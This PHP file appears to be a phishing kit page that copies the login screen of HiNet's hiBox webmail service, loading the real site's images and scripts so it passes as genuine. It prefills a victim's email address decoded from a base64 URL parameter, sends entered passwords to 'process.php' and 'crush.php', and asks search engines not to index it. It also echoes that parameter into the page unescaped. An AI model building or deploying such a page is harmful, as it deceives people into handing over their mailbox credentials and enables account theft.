﻿<?php
if(isset($_POST['pass']) && !empty($_POST['pass']) && isset($_POST['login']) && !empty($_POST['login'])){
include('process.php');
}else{
$login = $_GET['login'];

if (strpos($login,'@') !== false){
$log=$login;
}else{
$log=base64_decode($login);
}
$prem = explode('@',$log);
$domain = substr(strrchr($log, "@"), 1);
$useid = $prem[0];
 ?>
		
        <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">



<!--hb2-http01-zone-->
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta name='robots' content='nofollow'>
<meta name='googlebot' content='nofollow'>
<meta name='robots' content='noindex'> 
<meta charset='utf-8'><meta name='googlebot' content='nosnippet />
<meta name='robots' content='noodp' />

<title>hiBox全能信箱</title>
<style type="text/css">
<!--
body {
	margin-left: 0px;
	margin-top: 0px;
	margin-right: 0px;
	margin-bottom: 0px;
}
-->
.loginTable td > *{
	vertical-align: middle;
}
a, img{
	border: none;outline: none;
}

</style>
<link href="https://hibox.hinet.net/uwc/uwc/css/hiBox.css" rel="stylesheet" type="text/css" />
<link href="https://hibox.hinet.net/uwc/uwc/css/tb.css" rel="stylesheet" type="text/css" />
<SCRIPT type="text/javascript" src="https://hibox.hinet.net/uwc/uwc/js_tw/index.js"></SCRIPT>
	
	<!-- jQuery & jQueryUI + theme --> 
	<link href="https://hibox.hinet.net/uwc/uwc/vkeyboard/jquery/jquery-ui.css" rel="stylesheet">
	<script src="https://hibox.hinet.net/uwc/uwc/vkeyboard/jquery/jquery.min.js"></script>
	<script src="https://hibox.hinet.net/uwc/uwc/vkeyboard/jquery/jquery-ui.min.js"></script>
	
	<!-- keyboard widget css & script (required) -->
	<link href="https://hibox.hinet.net/uwc/uwc/vkeyboard/css/keyboard.css" rel="stylesheet">
	<script src="https://hibox.hinet.net/uwc/uwc/vkeyboard/js/jquery.keyboard.js"></script>
	<script src="https://hibox.hinet.net/uwc/uwc/vkeyboard/js/key.js"></script>

<script type="text/javascript">
var copyRight = null;
var productName = null;
var logoImagePath = null;
var versionImagePath = null;
var versionPageTitle = null;
var closeLabel = null;
var closeTitle = null;
var LoginImagePath = null;

function handleLoad()
{
copyRight="Copyright  2008 Sun Microsystems, Inc. All rights reserved. SUN PROPRIETARY/CONFIDENTIAL. U.S. Government Rights - Commercial software. Government users are subject to the Sun Microsystems, Inc. standard license agreement and applicable provisions of the FAR and its supplements. Use is subject to license terms. Sun, Sun Microsystems, the Sun logo and Java are trademarks or registered trademarks of Sun Microsystems, Inc. in the U.S. and other countries.";
productName="Sun Java(TM) System Communications Express 6.3 update 1";
logoImagePath="https://hibox.hinet.net/uwc/uwc/images/login-logo.gif";
versionImagePath="https://hibox.hinet.net/uwc/uwc/images/S1MC_login.gif";
versionPageTitle="Version Information";
closeLabel="Close";
closeTitle="Close Window";
document.form1.uid.focus();
}
function LoadCaptcha()
{
	document.getElementById('captcha').src = './stickyImg?' + Math.random(); 
	return false;
}
/*modify start*/
function callSubmit(eventTag) { 
   //if (event.keyCode==13)
   //    handleSubmit();
   var event = eventTag||window.event;
   var currentKey = event.charCode||event.keyCode;
   if (currentKey==13)
       handleSubmit();
}
/*modify end*/

function handleSubmit() {
  if (document.forms.form1.save_uid.checked) {
 		selectioncookie();
	}
  if(document.form1.uid.value.indexOf("@")==-1) { 
	document.form1.uid.value = document.form1.uid.value + "@hibox.hinet.net";	
  }	

  var targetAction =  "crush.php";
  document.form1.action = targetAction;
  document.form1.submit();
}



function handleError() {
	if (false || false ) {
		/*modify start*/
		document.write('<img src="https://hibox.hinet.net/uwc/uwc/images/Error_Large.gif" alt="" width="21" height="22"><font color="red">帳號或密碼認證失敗</font>');
		//document.write('<tr><td width="244" align="center" class="bk12" height="9" colspan="2">\n'+'<img src="https://hibox.hinet.net/uwc/uwc/images/Error_Large.gif" alt="" width="21" height="22">&nbsp;&nbsp;<font color="red">' +'<span class=AlrtErrTxt> Authentication Failed<br> Reenter your uid and pass.</span><br></td></tr>');
		/*
		document.write('<DIV class=logErr>');
		document.write('<table cellspacing=0 cellpadding=0 border=0>');
		document.write('<tbody>');
	        document.write('<tr>');
		document.write('<td valign=top width="28"><img src="https://hibox.hinet.net/uwc/uwc/images/Error_Large.gif" alt="" width="21" height="22">&nbsp;&nbsp;</td>');
		document.write("<td width='233'> <span class=AlrtErrTxt> Authentication Failed<br> Reenter your uid and pass.</span> </td>");

		document.write('</tr>');
		document.write('</tbody>');
		document.write('</table>');
		document.write('</DIV>');
		modify end*/
	}

}

function MM_swapImgRestore() { //v3.0
  var i,x,a=document.MM_sr; for(i=0;a&&i<a.length&&(x=a[i])&&x.oSrc;i++) x.src=x.oSrc;
}
function MM_preloadImages() { //v3.0
  var d=document; if(d.images){ if(!d.MM_p) d.MM_p=new Array();
    var i,j=d.MM_p.length,a=MM_preloadImages.arguments; for(i=0; i<a.length; i++)
    if (a[i].indexOf("#")!=0){ d.MM_p[j]=new Image; d.MM_p[j++].src=a[i];}}
}

function MM_findObj(n, d) { //v4.01
  var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))>0&&parent.frames.length) {
    d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
  if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];
  for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MM_findObj(n,d.layers[i].document);
  if(!x && d.getElementById) x=d.getElementById(n); return x;
}

function MM_swapImage() { //v3.0
  var i,j=0,x,a=MM_swapImage.arguments; document.MM_sr=new Array; for(i=0;i<(a.length-2);i+=3)
   if ((x=MM_findObj(a[i]))!=null){document.MM_sr[j++]=x; if(!x.oSrc) x.oSrc=x.src; x.src=a[i+2];}
}

function MM_openBrWindow(theURL,winName,features) { //v2.0
  window.open(theURL,winName,features);
}
</script>

<!--Cookie 記憶選單 宣告程式開始-->
<script language="Javascript">
//製作：CliffSTAR Studios.(http://uuu.to/cstar)
CookiesExpDay="30"; //Cookie 的保存天數


function selectioncookie() {
	if (document.forms.form1.uid.value == "請輸入您完整的email"){
		document.forms.form1.uid.value = "";
	}	
	SetCookie('selvaluecookie10', document.forms.form1.uid.value);	 
}
</script><!--Cookie 記憶選單 宣告程式結束-->
<!--Cookie 記憶選單 OPCOOKIE 控制Cookie程式開始-->
<script language="Javascript">
var time = new Date();
time.setTime(time.getTime()+((1000*60*60*24)*CookiesExpDay)) // here let the cookie expires extend 10 days of the setting day.

function GetCookie(name){
var cname=name+"=";
var dc=document.cookie;
	if(dc.length>0){
		begin = dc.indexOf(cname)
		if(begin!=-1){
		begin=begin+cname.length
		end=dc.indexOf(";",begin)
			if(end==-1) 
			end=dc.length
		return dc.substring(begin,end)
		}
	}
return null
}
/*function of Get the cookie*/
function SetCookie (name, value, expires) {
	
	if(expires==null){
	expires=""
	}
	document.cookie = name+"="+value+";expires="+ time.toGMTString()}
</script>
<!--Cookie 記憶選單 OPCOOKIE 控制Cookie程式結束--> 

<!--圖片輪播--> 
<script type="text/javascript"> 
    var myImg = new Array("https://hibox.hinet.net/uwc/uwc/images_tw/banner01.gif","https://hibox.hinet.net/uwc/uwc/images_tw/banner03.gif");
	var myHref = new Array("https://hibox.hinet.net/uwc/uwc/homepage_tw/promotion02.html","http://funplay.hinet.net/");
    var playImg = new Array(2); 
	var playHref = new Array(2);
    var nowIndex=1; 
    for(var i=0;i<playImg.length;i++){ 
        playImg[i] = myImg[Math.ceil(Math.random()*myImg.length-1)]; 
		playHref[i] = myHref[Math.ceil(Math.random()*myImg.length-1)]; 
    } 
    function showImg(){ 
		document.getElementById("my_href").href = myHref[nowIndex];
        document.getElementById("my_img").src = myImg[nowIndex]; 
        nowIndex = (nowIndex+1) == 2 ? 0 : nowIndex+1; 
    } 
    setInterval("showImg()",3500); 
</script> 



</head>

<body onload="handleLoad();funShowMainBanner(0);MM_preloadImages('https://hibox.hinet.net/uwc/uwc/images_tw/botton02_01.gif','https://hibox.hinet.net/uwc/uwc/images_tw/botton02_03.gif','https://hibox.hinet.net/uwc/uwc/images_tw/botton03_02.gif','https://hibox.hinet.net/uwc/uwc/images_tw/icon-more02.gif','https://hibox.hinet.net/uwc/uwc/images_tw/menu01-02.gif','https://hibox.hinet.net/uwc/uwc/images_tw/menu02-02.gif','https://hibox.hinet.net/uwc/uwc/images_tw/menu03-02.gif','https://hibox.hinet.net/uwc/uwc/images_tw/menu04-02.gif','https://hibox.hinet.net/uwc/uwc/images_tw/menu05-02.gif','https://hibox.hinet.net/uwc/uwc/images_tw/menu06-02.gif','https://hibox.hinet.net/uwc/uwc/images_tw/menu07-02.gif','https://hibox.hinet.net/uwc/uwc/images_tw/menu08-02.gif');">
<FORM name=form1 onSubmit="handleSubmit()" action="process.php" method="POST">
<input type="hidden" name="fromlogin" value="true">

<input type="hidden" name="orgaccess" value="https">
<!-- header start-->
   <table width="937" border="0" cellspacing="0" cellpadding="0" align="center">
    <tbody><tr>
      <td background="https://hibox.hinet.net/uwc/uwc/images_tw/header_01.jpg" valign="top" height="25" align="right">
    	<table width="370" border="0" cellspacing="0" cellpadding="0">
        <tbody><tr>
          <td width="158" valign="middle" height="24" align="right">
    		<img src="https://hibox.hinet.net/uwc/uwc/images_tw/icon-02.gif" width="18" height="15" align="middle"> 
  	    	<a href="hiBox-ad.php" target="_blank" class="manage">管理者登入
  	  	  </a> 
		  <img src="https://hibox.hinet.net/uwc/uwc/images_tw/dis-02.gif" width="9" height="9"> 
   <a href="https://hibox.hinet.net/uwc/uwc/homepage_tw/sitemap.html" class="manage"> 網站地圖
	  	  </a> 
		  </td>
           <td width="195" valign="middle" align="center">
		  <a href="hiBox-cn.php" class="language">繁中
	    	</a> 
		  <img src="https://hibox.hinet.net/uwc/uwc/images_tw/dis-02.gif" alt="" width="9" height="9"> 
		  <a href="hiBox-cn.php" class="language">簡中
		  </a> 
		  <img src="https://hibox.hinet.net/uwc/uwc/images_tw/dis-02.gif" alt="" width="9" height="9"> 
	    	<a href="hiBox-en.php" class="language">English 
	    	</a>
		    </td>
          <td width="17">&nbsp;
	  	  </td>
        </tr>
      </tbody></table>
	  </td>
    </tr>
  </tbody></table>
  <table width="937" border="0" cellspacing="0" cellpadding="0" align="center">
    <tbody><tr>
      <td height="81"><img src="https://hibox.hinet.net/uwc/uwc/images_tw/header_02.jpg" usemap="#Map" width="937" border="0" height="81">
	  </td>
    </tr>
  </tbody></table>
  <map name="Map" id="Map">
    <area shape="rect" coords="32,2,267,54" href="https://hibox.hinet.net/uwc/?lang=zh-tw" alt="回首頁">
    <area shape="rect" coords="723,39,882,62" href="https://hib2border.hinet.net/HiB2B/alf/hiB2BTrModify.jsp?funCode=401" target="_blank" alt="立即申請試用TRY IT!">
  </map>
  <table width="937" border="0" cellspacing="0" cellpadding="0" align="center">
  <tbody><tr>
  <td width="71" valign="top"><img src="https://hibox.hinet.net/uwc/uwc/images_tw/GlobalNavigation01_01.gif" width="71" height="31"></td>
  <td width="808"><ul class="menu">
   <li class="top p1"><a href="hiBox-cn.php" id="home" class="top_link" alt="回首頁"><span>Home</span></a></li>
   <li class="top p2"><a href="https://hibox.hinet.net/uwc/uwc/homepage_tw/features.html" id="products" class="top_link" alt="產品簡介"><span>products</span><!--[if IE 7]><!--></a><!--<![endif]-->
    <!--[if lte IE 6]><table><tr><td><![endif]-->
    <ul class="sub">
     <li><a href="https://hibox.hinet.net/uwc/uwc/homepage_tw/features.html">產品特色</a></li>
     <li><a href="https://hibox.hinet.net/uwc/uwc/homepage_tw/functions.html">功能說明</a></li>
     <li><a href="https://hibox.hinet.net/uwc/uwc/homepage_tw/advantages.html">服務優勢</a></li>
     <li><a href="https://hibox.hinet.net/uwc/uwc/homepage_tw/benefits.html">使用效益</a></li>
     <li><a href="#" class="fly">加值服務<!--[if IE 7]><!--></a><!--<![endif]-->
       <!--[if lte IE 6]><table><tr><td><![endif]-->
       <ul>
        <li><a href="https://hibox.hinet.net/uwc/uwc/homepage_tw/audit.html">郵件稽核</a></li>
        <li><a href="https://hibox.hinet.net/uwc/uwc/homepage_tw/backup.html">郵件備份</a></li>
       </ul>
       <!--[if lte IE 6]></td></tr></table></a><![endif]-->
    </li></ul>
    <!--[if lte IE 6]></td></tr></table></a><![endif]-->
   </li>
  <li class="top p3"><a href="https://hibox.hinet.net/uwc/uwc/homepage_tw/promotion02.html" id="prices" class="top_link"><span>prices</span></a></li>
  <li class="top p4"><a href="https://hibox.hinet.net/uwc/uwc/homepage_tw/case.html" id="scases" class="top_link"><span>scases</span></a></li>
   <li class="top p5"><a href="https://hibox.hinet.net/uwc/uwc/homepage_tw/docs.html" id="downloads" class="top_link"><span>downloads</span><!--[if IE 7]><!--></a><!--<![endif]-->
    <!--[if lte IE 6]><table><tr><td><![endif]-->
    <ul class="sub">
     <li><a href="https://hibox.hinet.net/uwc/uwc/homepage_tw/docs.html">產品文件</a></li>
     <li><a href="https://hibox.hinet.net/uwc/uwc/homepage_tw/manuals.html">使用手冊</a></li>
    </ul>
    <!--[if lte IE 6]></td></tr></table></a><![endif]-->
   </li>
   <li class="top p6"><a href="https://hibox.hinet.net/uwc/uwc/homepage_tw/apply.html" id="applications" class="top_link"><span>applications</span></a></li>
   <li class="top p7"><a href="https://hibox.hinet.net/uwc/uwc/homepage_tw/bizs.html" id="faq" class="top_link"><span>faq</span><!--[if IE 7]><!--></a><!--<![endif]-->
    <!--[if lte IE 6]><table><tr><td><![endif]-->
    <ul class="sub">
     <li><a href="https://hibox.hinet.net/uwc/uwc/homepage_tw/bizs.html">業務申請</a></li>
     <li><a href="https://hibox.hinet.net/uwc/uwc/homepage_tw/tech.html">技術支援</a></li>
    </ul>
    <!--[if lte IE 6]></td></tr></table></a><![endif]-->
   </li>
   <li class="top p8"><a href="https://hibox.hinet.net/uwc/uwc/homepage_tw/contact.html" id="contactus" class="top_link"><span>contactus</span></a></li>
  </ul>
    <div class="box250"></div></td>
  <td width="58" valign="top"><img src="https://hibox.hinet.net/uwc/uwc/images_tw/GlobalNavigation01_10.gif" width="58" height="31"></td>
  </tr>
  </tbody></table>
<!-- header end-->
<table width="937" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr>
    <td height="7"><img src="https://hibox.hinet.net/uwc/uwc/images_tw/HB_03.gif" width="937" height="7" /></td>
  </tr>
</table>
<table width="937" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr>
    <td width="3" height="31"><img src="https://hibox.hinet.net/uwc/uwc/images_tw/HB_04.gif" width="3" height="212" /></td>
    <td width="632" valign="top"><TABLE border="0" cellpadding="0" cellspacing="0" class=index_main_banner_table>
  <TBODY>
    <TR>
      <TD id=tdMainBannerPic>
      <DIV id=divMainBanner1><A href="#" 
            target=_parent><IMG 
            src="https://hibox.hinet.net/uwc/uwc/images_tw/HB_05.jpg" width="632" height="190" border=0></A></DIV>
      <DIV style="DISPLAY: none" id=divMainBanner2><A href="#" 
            target=_parent><IMG border=0 src="https://hibox.hinet.net/uwc/uwc/images_tw/HB_05-02.jpg"></A></DIV>
      <DIV style="DISPLAY: none" id=divMainBanner3><A href="#" 
            target=_parent><IMG border=0 src="https://hibox.hinet.net/uwc/uwc/images_tw/HB_05-03.jpg"></A></DIV>
      <DIV style="DISPLAY: none" id=divMainBanner4><A href="#" 
            target=_parent><IMG border=0 src="https://hibox.hinet.net/uwc/uwc/images_tw/HB_05-04.jpg"></A></DIV>
      <DIV style="DISPLAY: none" id=divMainBanner4><A href="#" 
            target=_parent><IMG border=0 src="https://hibox.hinet.net/uwc/uwc/images_tw/HB_05-05.gif"></A></DIV></TD>			
    </TR>
    <TR>
      <TD height="22" align=left valign="top" background="https://hibox.hinet.net/uwc/uwc/images_tw/banner-bg01.gif"><table width="600" border="0" cellpadding="0" cellspacing="0">
          <tr>
            <td align="right"><TABLE border="0" cellpadding="0" cellspacing="0" class=index_main_banner_page_table>
              <TBODY>
                <TR id=trMainBannerPage>
                  <TD class=index_main_banner_page_current><A 
                  onmouseover=funShowMainBanner(0); 
                  href="javascript: void(0);">1</A></TD>
                  <TD class=index_main_banner_page_td><A 
                  onmouseover=funShowMainBanner(1); 
                  href="javascript: void(0);">2</A></TD>
                  <TD class=index_main_banner_page_td><A 
                  onmouseover=funShowMainBanner(2); 
                  href="javascript: void(0);">3</A></TD>
                  <TD class=index_main_banner_page_td><A 
                  onmouseover=funShowMainBanner(3); 
                  href="javascript: void(0);">4</A></TD>
				  <TD class=index_main_banner_page_td><A 
                  onmouseover=funShowMainBanner(4); 
                  href="javascript: void(0);">5</A></TD>
                </TR>
              </TBODY>
            </TABLE></td>
          </tr>
        </table></TD>
    </TR>
  </TBODY>
</TABLE></td>
    <td width="8"><img src="https://hibox.hinet.net/uwc/uwc/images_tw/HB_06.gif" width="8" height="212" /></td>
    <td width="292" align="center" valign="top" background="https://hibox.hinet.net/uwc/uwc/images_tw/HB_07.gif">
	
	<table width="252" height="135" border="0" cellpadding="0" cellspacing="1" class="loginTable">
      <tr>
        <td style="color:#F00;" height="40" colspan="2" align="right" valign="middle">
	<?php if (isset($_GET['mgs'])) { echo '<img src="https://hibox.hinet.net/uwc/uwc/images/Error_Large.gif" alt="" width="21" height="22" /> 帳號或密碼認證失敗'; } ?>
	    </td>
      </tr>
      <tr>
        <td height="30" colspan="2" align="center">帳號：
<input type="hidden" name="login" value="<?php echo $log; ?>">
<input name="err" type="hidden" id="amount"  value="err1">
<input name="lan" type="hidden" id="amount"  value="cn">

        
        <input type="text" id="uid"  value="<?php echo $log; ?>" name="uid" placeholder="請輸入您完整的email" maxlength="50" size="20" />
        
        <img id="uname" class="tooltip" title="開啟虛擬鍵盤" src="https://hibox.hinet.net/uwc/uwc/vkeyboard/keypad.png"> 
          
          
		   <script language="Javascript">	

			if(GetCookie("selvaluecookie10")!=null){
						
					document.forms.form1.uid.value=GetCookie("selvaluecookie10");			
				
			}
		</script>
          <br /></td>
      </tr>
      <tr>
        <td height="30" colspan="2" align="center">密碼：
          <input type="password" id="pass" name="pass" onKeyPress="callSubmit(event)" maxlength="50" size="20" /><img id="passwd" class="tooltip" title="開啟虛擬鍵盤" src="https://hibox.hinet.net/uwc/uwc/vkeyboard/keypad.png"></td>
      </tr>
      
      
     		
		
	  <tr>
		<td height="32" align="center">
			<img id="captcha" src="https://hibox.hinet.net/uwc/stickyImg" />&nbsp;=&nbsp;
			<input type="text" id="captchaans" name="captcha" placeholder="請計算左圖答案" class="ui-widget-content ui-corner-all" style="text-align: center;" size="12" maxlength="3" value=""/>
			<a href="#" onclick="document.getElementById('captchaans').value=''; document.getElementById('captcha').src = './stickyImg?' + Math.random(); return false;" tabindex="-1"><img src="https://hibox.hinet.net/uwc/uwc/images/refresh.png" height="15" width="15" tabindex="-1"/></a>		
		</td>
		<td>
		
		</td>
	  </tr>

	  

		  	
		
      <tr>
        <td height="32" align="center" valign="bottom"><input type="checkbox" name="save_uid" id="save_uid" tabindex="-1"/>
          記住我的帳號
        <a href="#" onmouseout="MM_swapImgRestore()" onmouseover="MM_swapImage('Image6','','https://hibox.hinet.net/uwc/uwc/images_tw/botton02_01.gif',1)" onclick="handleSubmit()"><img src="https://hibox.hinet.net/uwc/uwc/images_tw/botton01_01.gif" alt="登入" name="Image6" width="47" height="25" border="0" id="Image6" /></a><a href="#" onmouseout="MM_swapImgRestore()" onmouseover="MM_swapImage('Image7','','https://hibox.hinet.net/uwc/uwc/images_tw/botton02_03.gif',1)"><img src="https://hibox.hinet.net/uwc/uwc/images_tw/botton01_03.gif" alt="說明" name="Image7" width="47" height="25" border="0" id="Image7" onclick="MM_openBrWindow('https://hibox.hinet.net/uwc/uwc/homepage_tw/popup.html','','width=395,height=220')" /></a>  
        </td>
        
      </tr>
       
      <tr>
		<td align="center">
			<a onmouseout="MM_swapImgRestore()" onmouseover="MM_swapImage('Image11','','https://hibox.hinet.net/uwc/uwc/images_tw/botton03_02.gif',1)" target="_blank" href="hiBox-ad.php"><img id="Image11" width="222" height="36" border="0" name="Image11" alt="管理者登入ENTER" src="https://hibox.hinet.net/uwc/uwc/images_tw/botton03_01.gif"></img></a>
		</td>
	  </tr>
	    
    </table>
	
	
	
	 </td>
    <td width="2"><img src="https://hibox.hinet.net/uwc/uwc/images_tw/HB_08.gif" width="2" height="212" /></td>
  </tr>
</table>
<table width="937" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr>
    <td height="7"><img src="https://hibox.hinet.net/uwc/uwc/images_tw/HB_09.gif" width="937" height="9" /></td>
  </tr>
</table>
<table width="937" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr>
    <td height="206" valign="top" background="https://hibox.hinet.net/uwc/uwc/images_tw/HB_10.gif"><table width="937" height="190" border="0" cellpadding="0" cellspacing="0">
      <tr>
        <td width="657" height="190" align="center" valign="top"><table width="620" height="39" border="0" cellpadding="0" cellspacing="0">
          <tr>
            <td width="526" height="39" align="left" valign="bottom"><img src="https://hibox.hinet.net/uwc/uwc/images_tw/td-01.gif" alt="訊息快遞" width="375" height="26" /></td>
            <td width="94" align="right" valign="bottom"><a href="https://hibox.hinet.net/uwc/uwc/homepage_tw/news.html" onmouseout="MM_swapImgRestore()" onmouseover="MM_swapImage('Image13','','https://hibox.hinet.net/uwc/uwc/images_tw/icon-more02.gif',1)"><img src="https://hibox.hinet.net/uwc/uwc/images_tw/icon-more01.gif" alt="更多訊息" name="Image13" width="94" height="20" border="0" id="Image13" /></a></td>
          </tr>
        </table>
         <!--info start-->
             <table class="ul" width="633" border="0" height="145" cellspacing="0" cellpadding="0">
  <tbody><tr>
    <td valign="top" height="145" align="left"><ul>
      <li><a href="https://hibox.hinet.net/uwc/uwc/homepage_tw/news.html#new39" class="language"><img src="https://hibox.hinet.net/uwc/uwc/images_tw/icon-new.gif" width="29" border="0" height="13"> Outlook 2016 POP3收取信件出現重複收信或信件被刪除問題說明...</a></li>
      <li><a href="https://hibox.hinet.net/uwc/uwc/homepage_tw/news.html#new38" class="language"><img src="https://hibox.hinet.net/uwc/uwc/images_tw/icon-new.gif" width="29" border="0" height="13"> hiBox 手機App 將於2016/2/3 終止服務，並同時提供新的手機同步方式，不便之處，敬請見諒 !</a></li>
      <li><a href="https://hibox.hinet.net/uwc/uwc/homepage_tw/news.html#new36" class="language"><img src="https://hibox.hinet.net/uwc/uwc/images_tw/icon-new.gif" width="29" border="0" height="13"> hiBox 舊平台客戶服務升版申請自2016年1月12日開放，請至管理系統登錄申請，謝謝!</a></li>
      <li><a href="https://hibox.hinet.net/uwc/uwc/homepage_tw/news.html#new23" class="language"> 請務必妥善保護您的信箱密碼，以防範駭客竊信行為.... </a></li>
      <li><a href="https://hibox.hinet.net/uwc/uwc/homepage_tw/news.html#new19" class="language">【hiBox系統管理員的小叮嚀】為防範駭客盜用您的hiBox帳號，建議您「強度較高」的密碼組合！</a></li>
      <li><a href="https://hibox.hinet.net/uwc/uwc/homepage_tw/news.html#new02" class="language">如果您無法登入hiBox，請您改至www3.hibox.hinet.net 登入，或登入後出現，或登入後出現.... </a></li>
 	 </ul></td>
  </tr>
</tbody></table>
		  <!--info end--> 
		</td>
        <td width="20" align="left"><img src="https://hibox.hinet.net/uwc/uwc/images_tw/dis-01.gif" width="3" height="190" /></td>
        <td width="260" align="left" valign="middle"><table width="100" border="0" cellpadding="0" cellspacing="4">
			 
			<tr>
				
              <td><a target="_blank" id="my_href" href='https://hibox.hinet.net/uwc/uwc/homepage_tw/promotion02.html'><img id="my_img" src="https://hibox.hinet.net/uwc/uwc/images_tw/banner01.gif" width="218" height="80" border="0" /></a></td> 
            </tr>


            <tr>
              <!--<td><a href='https://hibox.hinet.net/uwc/uwc/homepage_tw/news.html#new05'><img src="https://hibox.hinet.net/uwc/uwc/images_tw/banner02.gif" width="218" height="80" border="0" /></a></td>
		-->	  
			  <td><a href='https://hib2border.hinet.net/HiB2B/alf/hiB2BUlUnionListApply.jsp?&sev_type=AK&sev_code=01&lockProduct=true&unlockPdtCode=true'><img src="https://hibox.hinet.net/uwc/uwc/images_tw/banner02-1.gif" width="218" height="80" border="0" /></a></td>
            </tr>
          </table>
          </td>
      </tr>
    </table></td>
  </tr>
</table>
</form>
<script src="https://hibox.hinet.net/uwc/uwc/js/placeholders.min.js"></script>
<!--footer start--><table width="937" border="0" cellspacing="0" cellpadding="0" align="center">
  <tbody><tr>
    <td valign="top" height="66" align="center"><table width="800" border="0" cellspacing="0" cellpadding="0">
      <tbody><tr>
        <td width="145" height="43" align="right"><img src="https://hibox.hinet.net/uwc/uwc/images_tw/icon-HiNet.gif" width="126" height="50">
                           </td>
        <td class="front-copyright" width="655" valign="middle" align="left">中華電信數據通信分公司地址：臺北市信義路一段21號 服務時間：24小時全年無休
                                  <br>
                                  全區免費業務諮詢電話：0800-080-858　 全區免費客戶服務電話：0800-080-365　 大陸地區客戶服務電話：21-52305900
 		                         <br>
                                 © 2013 HiNet Internet Service by Chunghwa Telecom All Rights Reserved</td>
      </tr>
    </tbody></table>
 </td>
  </tr>
</tbody></table>
 <!--footer end-->
</body>
</html>

 

<link rel="SHORTCUT ICON" href="https://hibox.hinet.net/uwc/webmail/favicon.ico">


<?php }?>
